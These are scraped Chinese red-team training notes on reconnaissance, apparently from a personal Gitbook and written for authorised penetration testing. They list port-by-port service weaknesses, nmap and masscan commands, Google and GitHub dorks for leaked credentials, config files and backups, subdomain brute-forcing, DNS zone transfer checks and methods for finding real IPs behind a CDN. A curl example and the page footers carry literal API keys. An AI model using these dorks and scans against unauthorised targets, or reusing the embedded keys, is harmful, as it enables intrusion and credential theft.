web｜Tomcat｜.. 常见Web攻击、控制台爆破、对应服务器版本漏洞、Tomcat漏洞 8069 zabbix 远程命令执行 9090 websphere 文件泄露、爆破：控制台弱口令、Java反序列 9200 elasticsearch 未授权访问、远程代码执行 9300 elasticsearch 未授权访问、远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破、未授权访问 27018 mongodb 爆破、未授权访问 50070 Hadoop 爆破、未授权访问 50075 Hadoop 爆破、未授权访问 14000 Hadoop 爆破、未授权访问 8480 Hadoop 爆破、未授权访问 8088 web 爆破、未授权访问 50030 Hadoop 爆破、未授权访问 50060 Hadoop 爆破、未授权访问 60010 Hadoop 爆破、未授权访问 60030 Hadoop 爆破、未授权访问 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 10003 Hadoop 爆破、未授权访问 5984 couchdb 未授权访问 445 SMB 弱口令爆破，检测是否有ms_08067等溢出 1025 111 NFS 2082 cpanel主机管理系统登陆 （国外用较多） 2083 cpanel主机管理系统登陆 （国外用较多） 2222 DA虚拟主机管理系统登陆 （国外用较多） 2601 zebra路由 2604 zebra路由 3128 代理默认端口,如果没设置口令很可能就直接漫游内网了 3311 kangle主机管理系统登陆 3312 kangle主机管理系统登陆 4440 参考WooYun: 借用新浪某服务成功漫游新浪内网 6082 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7778 主机控制面板登录 8083 主机管理系统 （国外用较多） 8649 8888 主机管理系统默认端口 9000 fcgi php执行 50000 SAP 命令执行 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 15:12:24 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/12.端口扫描/02端口扫描.html":{"url":"红蓝对抗/01.打点/01.信息收集/12.端口扫描/02端口扫描.html","title":"02端口扫描","keywords":"","body":"0x01 ip存活扫描 sudo nmap -sn -PE -n -PS80,443,7547,22,4567 -PA22,80 -PP -PU -v --open --min-parallelism=100 -T4 --max-retries 0 --max-rtt-timeout=1 --min-hostgroup=50000 nmap -sn -PE -n -PS80,443,7547,22,4567 -PU 10.10.0.0/16 -v --min-rate 1000 0x02 端口扫描 全端口 sudo nmap -sV -Pn --script=banner -n -T4 --max-retries 0 192.168.0.1 -p1-65535 默认常见端口 sudo nmap -sV -Pn --script=banner -n -T4 --max-retries 0 192.168.0.1 nmap_alive_command = '-sn -PE -n -PS80,443,7547,22,4567 -PU -oG {} -iL {} -v --min-rate {}' nmap_os_command = '-sS -Pn -O -n --host-timeout {}' nmap_tcp_scan_command = '-sV -Pn --script=banner -n --host-timeout {} -oN {}' nmap_udp_scan_command = '-sU -Pn --script=banner -n --host-timeout {} -oN {}' sudo masscan -p3389 --rate 5000 --wait 0 --adapter utun5 192.168.30.0/24 0x03 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 15:15:16 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/13.指纹识别/01Web指纹识别（一）.html":{"url":"红蓝对抗/01.打点/01.信息收集/13.指纹识别/01Web指纹识别（一）.html","title":"01Web指纹识别（一）","keywords":"","body":"0x01 前言 识别出来目标的指纹可以帮助我们快速了解目标情况，可以有三条攻击路径 0day、1day直接打 根据识别到的指纹找到源代码进行代码审计 去寻找历史CVE、CNVD漏洞进行漏洞利用 0x02 在线CMS指纹识别平台 bugscaner: http://whatweb.bugscaner.com/look/ 数字观星: https://fp.shuziguanxing.com/#/ 云悉: https://www.yunsee.cn/ （需要注册，以前还好，感觉现在不靠谱，说的提交指纹一周左右给回复，等了一周多都没反应） 0x03 工具识别指纹 目前没推荐，因为我也没找到好用的，指纹识别个人感觉主要是指纹库的维护和更新。再就是经验积累上来了，哪些洞会利用，基本一眼也就看出来了。（个人对自己的定位还是不能有短板，Web指纹识别这个暂时不花费精力去整了。） 0x04 浏览器插件识别 https://www.wappalyzer.com/ 该插件对应的开源指纹库 https://github.com/wappalyzer/wappalyzer/tree/master/src/technologies 0x05 WAF识别 01 手动 一般来说WAF都会拦截敏感文件下载，如a.sql、a.mdb等，直接添加到网站URL中即可 一些WAF可能不防护这些，那么就可以拿一些XSS、SQLI的payload来测试也可 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 15:29:49 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/14.空间搜索引擎使用/01空间搜索引擎常规使用.html":{"url":"红蓝对抗/01.打点/01.信息收集/14.空间搜索引擎使用/01空间搜索引擎常规使用.html","title":"01空间搜索引擎常规使用","keywords":"","body":"Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 18:04:17 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/01.GoogleHack.html":{"url":"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/01.GoogleHack.html","title":"01.GoogleHack","keywords":"","body":"0x01 前言 合理利用搜索引擎，可以发现很多的敏感信息。 0x02 语法说明 Google检索技巧大全: https://sites.google.com/site/hopeanwang/google%E6%A3%80%E7%B4%A2%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8 运算符 用途 实际用法实例 \"\"(双引号) 搜索词放在双引号中，代表完全匹配搜索 \"keyword\" *（通配符） * 号代表任何文字，比如想查找\"搜索*擎\"，返回的结果就不仅包含\"搜索引擎\"，还包含了\"搜索收擎\"，\"搜索巨擎\"等内容。 \"搜索*擎\" +（与） 搜索所有包含关键词\"keyword1\"和\"keyword2**\"的中文网页 \"keyword1 keyword2\" \"keyword1+keyword2\" -（非） 搜索去除keyword2的keyword1 \"keyword1 -keyword2\" OR(或) 搜索 A 或者 B \"keyword1 OR keyword2\" ~keyword1 搜索它的同义词 ~喜欢 ~keyword1-keyword2 只搜索同义词,不要原词 ~WORD-WORD 关键词 用途 实际用法实例 allinanchor: 限制搜索的词语是网页中链接内包含的关键词（可使用多个关键词） allinanchor: keyword1 keyword2 allintext: 限制搜索的词语是网页内文包含的关键词（可使用多个关键词） allintext: keyword1 keyword2 cache: 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 cache:https://www.baidu.com/ filetype/ext: 限制搜索的词语是网页中链接内包含的关键词 filetype:pdf ios开发 -filetype: -filetype:SOMEFILETYPE = 剔除指定文件类型. -filetype:SOMEFILETYPE intitle: 搜索网页标题中包含有特定字符的网页 intitle: 登陆 inurl: 搜索包含有特定字符的URL inurl: ?id= intext: 限制搜索的词语是网页内文包含的关键词 intext:密码 inanchor:keyword 指令返回的结果是导入链接锚文字中包含搜索词的页面 inanchor:关于我们 site: 搜索指定域名的内容 site:www.github.com keyword keyword site:www.github.com 0x03 一些常用的语法 一些常用的语法，帮助我们快速定位一些数据，主要还是依赖于上面部分的扩展，抛砖引玉 Google Hacking Database cxsecurity-hacking-dorks 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:file site:target.com inurl:upload 注入页面 site:target.com inurl:?id= site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle: \"index of\" SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:\"Warning: pg_connect()\" phpinfo site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-15 16:39:03 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/02.Github.html":{"url":"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/02.Github.html","title":"02.Github","keywords":"","body":"0x01 Github https://github.com/obheda12/GitDorker/tree/master/Dorks 所有语法txt版 alldorksv3 medium_dorks \"token\" \"password\" \"secret\" \"passwd\" \"username\" \"key\" \"apidocs\" \"appspot\" \"auth\" \"aws_access\" \"config\" \"credentials\" \"dbuser\" \"ftp\" \"login\" \"mailchimp\" \"mailgun\" \"mysql\" \"pass\" \"pem private\" \"prod\" \"pwd\" \"secure\" \"ssh\" \"staging\" \"stg\" \"stripe\" \"swagger\" \"testuser\" \"jdbc\" 0x02 在线搜索 https://cs.github.com/ 0x03 工具利用 效果不错，但是会触发github的爬虫机制，跑出来的结果需要人工进行二次筛选才能达到最佳利用 https://github.com/obheda12/GitDorker GitDorker 是一款github自动信息收集工具，它利用 GitHub 搜索 API 和作者从各种来源编译的大量 GitHub dorks 列表，以提供给定搜索查询的 github 上存储的敏感信息的概述。 常用命令、 全量特征字典 python3 GitDorker.py -d Dorks/alldorksv3 -q \"bilibili.com\" -tf Dorks/token.txt 小字典 python3 GitDorker.py -d Dorks/smalldorker.txt -q \"bilibili.com\" -tf Dorks/token.txt 0x04 其他代码平台 GitLab: https://about.gitlab.com/ gitee: https://gitee.com/ Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 09:56:09 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/03.JS敏感信息获取.html":{"url":"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/03.JS敏感信息获取.html","title":"03.JS敏感信息获取","keywords":"","body":"0x01 前言 在网站的JS代码中可能会存在大量的敏感信息，包括但不限于： 某些服务的接口，可以测试这些接口是否有未授权等 子域名，可能包含有不常见或者子域名收集过程中没收集到的目标 密码、secretKey等敏感数据 可以全局搜索http、\"/、这种关键词 0x02 工具 重复性工作使用工具来实现 01 JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。 https://github.com/Threezh1/JSFinder 油猴版JSFinder https://github.com/Threezh1/Deconstruct/tree/main/DevTools_JSFinder 简单爬取 python3 JSFinder.py -u http://www.mi.com 深度爬取 python3 JSFinder.py -u http://www.mi.com -d 02 LinkFinder https://github.com/GerbenJavado/LinkFinder 常用命令 python3 linkfinder.py -i https://mi.com -d -o cli 03 Hae https://github.com/gh0stkey/HaE 插件官方规则 https://gh0st.cn/HaE/ 04 浏览器插件 findsomething Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 14:31:12 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/04.历史页面.html":{"url":"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/04.历史页面.html","title":"04.历史页面","keywords":"","body":"0x00 前言 历史界面一些敏感敏感信息可能会泄露组织架构、全资子公司名称、敏感路由、子域名等 0x01 在线网址查询 https://web.archive.org/ 0x02 工具waybackurls https://github.com/tomnomnom/waybackurls 使用命令 cat domains.txt | waybackurls > urls 单目标 waybackurls domain 挂代理，效果不错 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 17:09:14 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/05.邮箱信息收集.html":{"url":"红蓝对抗/01.打点/01.信息收集/15.其他信息收集技巧/05.邮箱信息收集.html","title":"05.邮箱信息收集","keywords":"","body":"带天坑 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-18 17:14:24 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/2.根域名收集/01.根域名资产收集（一）.html":{"url":"红蓝对抗/01.打点/01.信息收集/2.根域名收集/01.根域名资产收集（一）.html","title":"01.根域名资产收集（一）","keywords":"","body":"通常情况下本脚本小子拿到的授权书要不是公司名字要不是一个主域名，那么可以通过下面的技巧扩展外网的根域名暴露面，提高接入目标内网的概率。 0x01. 利用ICP备案信息进行收集 在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经备案，不得在中华人民共和国境内从事经营性互联网信息服务。目前只要是企业在中国境内需要提供互联网服务，都必须通过ICP工商备案才能运行。（未备案的或者在备案路上的后面再讲）我们可以通过 信息备案管理系统 进行查询。 输入框支持反向查询。ICP备案查询：请输入单位名称或域名或备案号查询，请勿使用子域名或者带http://www等字符的网址查询 0x02.工商股权信息收集 从暴露面风险上来说企业在被收购或者控股后在IT架构上也会接入集团的IT网络中，相关的业务也会有比较紧密的合作，所有一旦子公司存在比较严重的安全风险，攻击者可将子公司的网络作为跳板进一步的公司集团核心业务系统。获取到子公司的名称后我们再通过利用ICP备案信息进行收集中的ICP备案信息查询获取到公司备案的其他根域名信息。 目前国内所有的企业，无论是私营企业还是国有企业都需要进行工商登记后才能进行企业正常运营。可以通过 国家企业信用信息公示系统 查询指定企业的工商注册信息。以及通过商业公司：天眼查、企查查、爱企查、小蓝本、钉钉企典、EnScan等平台查询到目标企业旗下其他业务的子公司名称，通过子公司的ICP备案信息再进一步扩展其他的根域名数据。 一般来说我们定义控股或者并购关系的公司一般都属于目标企业的所属集团，当然有些并购可能不对外公式，我们可以关注一些投融资的新闻来获取这部分讯息。 0x03. Whois数据信息收集 前面两步我们已经获取到企业在境内备案的根域名数据，但是在实际的入侵过程中往往会遇到企业分公司未经审计私开业务、企业非备案的境外业务等情况。每个域名的注册都必须对外公开Whois数据，但是现在很多域名商默认都会开启域名隐私保护，需要借助一些数据平台查询域名历史的Whois信息来进行关联。通过Whois网站 查询 利用ICP备案信息进行收集到的根域名 工商股权信息收集收集到的根域名 查询历史注册者和注册邮箱，扩展更多的关联资产。 0x04. SSL证书扩展 前面的步骤目前收集到大量的根域名信息，但是还是有一些域名它没有工商备案信息，域名也是新注册的开启了隐私保护从Whois历史数据中也没办法找到关联方法。可以借助资产探测平台来寻找一些域名关联的特征。企业在申请证书的时候一般会将同类业务域名的申请成一张成熟，一方面是出于成本考虑，还有一方面也是方面对证书进行同一的管理。 cert=\"\" 在证书里面发现的其他与目标强相关的关键词也可以再次查询。 0x05. DNS解析数据关联 一般大型的企业会自建DNS服务器用于业务域名的解析，一般情况只会对自有业务提供DNS解析服务。 nslookup -type=ns domain dig -t ns domain 将查询到的ns域名作为key，通过公开的DNS解析数据集rapid7 DNS 搭建DNSDB或者使用公开的数据集合 https://hackertarget.com/find-shared-dns-servers/ https://github.com/spyse-com/go-spyse 反向查询ns服务器对应的根域名数据。查询到的数据需要进行进一步的筛选和验证。 0x06. Web配置信息关联 响应头的CSP中定义允许跨域资源加载的白名单地址 Set-Cookie中定义Cookie适用的可用域范围 Set-Cookie的特殊标记 Server自定义业务名称 自定义的ICON图标（mmh3 hash） ICP备案号 在线的运营工具(百度统计、53客服、扫描登录等) 百度统计的hash 美洽客服 Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:21:02 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/2.根域名收集/02.根域名资产收集（二）.html":{"url":"红蓝对抗/01.打点/01.信息收集/2.根域名收集/02.根域名资产收集（二）.html","title":"02.根域名资产收集（二）","keywords":"","body":"https://zone.huoxian.cn/d/553-101 红蓝对抗之企业对外根域名资产收集 https://zone.huoxian.cn/d/257 企业根域名资产收集细节再补充 https://zone.huoxian.cn/d/103 信息收集系列之子域名发现 https://zone.huoxian.cn/d/275 信息收集系列之善用搜索引擎 https://zone.huoxian.cn/d/285 信息收集系列之domain_hunter_pro使用 https://zone.huoxian.cn/d/316-domain-hunter-pro 信息收集系列之JavaScript文件敏感信息提取 https://zone.huoxian.cn/d/336-javascript 信息收集系列之指纹识别 https://zone.huoxian.cn/d/372 信息收集系列之自动化工具ShuiZe_0x727 https://zone.huoxian.cn/d/396-shuize-0x727 信息收集系列之网站快照 https://zone.huoxian.cn/d/461 信息收集系列之资产风险监测系统Biu https://zone.huoxian.cn/d/514-biu 信息收集之“骚”姿势 @鱼七 https://zone.huoxian.cn/d/618 0x01 通过PTR记录收集 PTR记录，是电子邮件系统中的邮件交换记录的一种；另一种邮件交换记录是A记录（在IPv4协议中）或AAAA记录（在IPv6协议中）。PTR记录常被用于反向地址解析。尽可能多的收集目标的IP地址，然后通过PTR记录反向查询域名 1.收集IP段 https://bgp.he.net/search?search%5Bsearch%5D=tesla&commit=Search 2.正则提取IP段 (\\d{1,3}\\.){3}\\d{1,3}\\/\\d{1,2} 3.解析PTR记录 cat tesla.txt | mapcidr -silent | dnsx -silent -ptr -resp-only -o output.txt 4.提取根域名 cat ~/Desktop/output.txt | python extract-root-domain.py - 提取脚本 import click from wsltools.domaintools import domain def generate(results): for result in results: if domain(result).valid: yield domain(result).main @click.command() @click.argument('filename', required=True, type=click.File(mode='r')) def main(filename): results = filename.read().splitlines() for r in set(generate(results)): click.echo(r) if __name__ == \"__main__\": main() 0x03 WHOIS反查接口推荐 https://drs.whoisxmlapi.com/reverse-whois-search 0x04 SSL证书扩展补充 除了通过fofa、shodan、zoomeye、quake等空间描绘搜索引擎，还可以通过http://tls.bufferover.run/收集 curl 'https://tls.bufferover.run/dns?q=.goodrv.com' -H 'x-api-key: AOQAtcfMK02TFg5BwMIJH4b621XQpBNCap8j0GPc' 通过ip获取tls证书 echo 'https://183.201.217.110/' | httpx -json -silent | jq 0x05 Hackerone 一些在hackerone上进行众测的厂商，会把自己的测试范围列举出来，其中就包含有大量的域名，因此通过hackerone来完善资产收集也是一个不错的方法。 https://hackerone.com/alibaba?type=team&view_policy=true 0x05 Google Google直接搜索里面的一些关键内容来查询，比如公司名、备案、引用的特殊js等 intext:浙ICP备09002987号 intext:33010002000070 -www Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-29 15:52:07 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/01.子域名资产收集（一）.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/01.子域名资产收集（一）.html","title":"01.子域名资产收集（一）","keywords":"","body":"0x01 子域名收集流程 0x02 通过第三方数据源收集 比较有名有VirusTotal、微步、SecurityTrails、Spyse、Censys等。 参考：https://gist.github.com/sidxparab/22c54fd0b64492b6ae3224db8c706228 0x03 子域名爆破 01 puredns 字典：https://raw.githubusercontent.com/joinsec/BadDNS/master/domaindict-170W.txt 优质的DNS服务ip：https://raw.githubusercontent.com/bp0lr/dmut-resolvers/main/resolvers.txt 爆破工具：https://github.com/d3mondev/puredns 安装部署 go环境 wget https://go.dev/dl/go1.17.11.linux-amd64.tar.gz tar -C /usr/local -xzf go1.17.11.linux-amd64.tar.gz export PATH=$PATH:/usr/local/go/bin （添加到/etc/profile） source /etc/profile massdns环境 git clone https://github.com/blechschmidt/massdns.git cd massdns make sudo make install 安装puredns go env -w GOPROXY=https://goproxy.cn go install github.com/d3mondev/puredns/v2@latest git clone https://github.com/d3mondev/puredns.git make 运行常用命令 puredns bruteforce ./domaindict-170W.txt domain.com --resolvers resolvers.txt 02 Layer子域名爆破工具（Windows GUI） https://github.com/euphrat1ca/LayerDomainFinder 0x04 排列组合 在我们渗透过程中，总是会发现一些子域名带有以下关键词 admin alpha api backend beta dev intra prod staging staging test uat 以sso.huoxian.cn举例子，可能会有如下命名方式的子域名 sso-test.huoxian.cn sso.test.huoxian.cn ssotest.huoxian.cn testsso.huoxian.cn 我们可以通过dnsgen这款工具生成子域名列表，再进行解析，来扩大攻击面。 echo 'sso.huoxian.cn' | dnsgen -w alt.txt - 0x05 存活验证 使用httox进行存活验证 mapcidr -cidr 122.9.131.0/24 | httpx -ports 8082,8082 --title --status-code --threads 200 -follow-host-redirects 搜集到的域名验活 cat tsl.txt | mapcidr -silent | httpx -ports 8082,8082 --title --status-code --threads 200 -follow-host-redirects Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 18:00:50 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/02.DNS域传送.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/02.DNS域传送.html","title":"02.DNS域传送","keywords":"","body":"0x01 DNS域传送漏洞简介 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。 0x02 检测方法 nslookup # 查询nameserver nslookup -type=ns knownsec.com 119.29.29.29 # 指定nameserver，列举域名信息 nslookup server dns29.hichina.com ls knownsec.com dig axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 # 找到NS服务器 dig knownsec.com ns # 发送axfr请求 dig axfr @f1g1ns2.dnspod.net knownsec.com nmap nmap的脚本dns-zone-transfer可以帮我们探测是否存在域传送漏洞 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=knownsec.com -p 53 -Pn f1g1ns1.dnspod.net Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-07-13 17:14:21 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/3.子域名收集/03.domain_hunter_pro使用.html":{"url":"红蓝对抗/01.打点/01.信息收集/3.子域名收集/03.domain_hunter_pro使用.html","title":"03.domain_hunter_pro使用","keywords":"","body":"0x01 前言 domain_hunter_pro是bit4woo开发的一款burp插件，方便快捷的目标管理、自动化的信息收集、与burp无缝衔接、与外部安全工具联动 https://github.com/bit4woo/domain_hunter_pro 0x02 以特斯拉为例 先从https://bugcrowd.com/tesla获取相关根域名。 0x03 OneForAll一把梭 python3 oneforall.py --target tesla.cn run 0x04 数据导入到domain_hunter_pro Copyright ©R1card0Mtu all right reserved，powered by Gitbook更新时间： 2022-06-30 10:16:14 new Valine({el: \"#vcomments\",appId: 'SgpscfQ9xIaQ1rhYNehrrL8s-MdYXbMMI',appKey: 'vuPt1hPCt8fYYBDSkayLO65P',placeholder: '请写下你的评论吧...',avatar: '',meta: undefined,pageSize: 10,lang: 'zh-CN',recordIP: false,serverURLs: 'https://sgpscfq9.api.lncldglobal.com'}) "},"红蓝对抗/01.打点/01.信息收集/4.IP段收集/01绕过CDN查找真实IP.html":{"url":"红蓝对抗/01.打点/01.信息收集/4.IP段收集/01绕过CDN查找真实IP.html","title":"01绕过CDN查找真实IP","keywords":"","body":"0x01 判断是否存在CDN 01 多地ping 如果没有使用CDN，则只会显示一个IP地址。 可以使用以下站点进行多地ping。 http://ping.chinaz.com/ https://ping.aizhan.com/ http://www.webkaka.com/Ping.aspx https://www.host-tracker.com/v3/check/ 02 nslookup法 nslookup -qt=A zone.huoxian.cn 8.8.8.8 如果返回域名解析对应多个 IP 地址多半是使用了 CDN 03 IP反查域名 查看是否存在大量不相关的IP https://securitytrails.com/ https://dns.aizhan.com/ https://x.threatbook.cn 反查域名发现很多，大概率是cdn 04 观察header 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 05 在线监测工具 https://www.cdnplanet.com/tools/cdnfinder/ https://tools.ipip.net/cdn.php https://whatsmycdn.com/ 06 浏览器插件 0x02 寻找真实IP 01 网络空间测绘引擎 寻找网站特征指纹然后利用空间测绘引擎搜索历史扫描结果 fofa shodan quake Censys.io 可搜索的点 - 响应头的CSP中定义允许跨域资源加载的白名单地址 - Set-Cookie中定义Cookie适用的可用域范围 - Set-Cookie的特殊标记 - Server自定义业务名称 - 自定义的ICON图标（mmh3 hash） - ICP备案号 - 在线的运营工具(百度统计、53客服、扫描登录等) - 百度统计的hash - 美洽客服 02 二级域名法 由于部分CDN价格昂贵，所以一些重要的站点会使用CDN加速，而一些子域名则没有使用，且极有可能和主站在同一C段，这时候，就可以通过发现目标的子域名，从而根据IP来定位主域名的IP地址。 子域名参照子域名收集 03 邮箱 一句话就是找到能让对方邮箱服务器给你发邮件的点，然后查看邮件源码，可以拿到目标邮件服务器的真实IP RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 04 海外ping 由于国内厂家可能只针对国内使用cdn，对海外没有铺设，导致通过通过海外的IP可以直接获取到真实IP。 可以使用： http://ping.chinaz.com/ https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 05 DNS历史解析记录 https://dnsdb.io/zh-cn/ https://securitytrails.com/ https://x.threatbook.cn/ 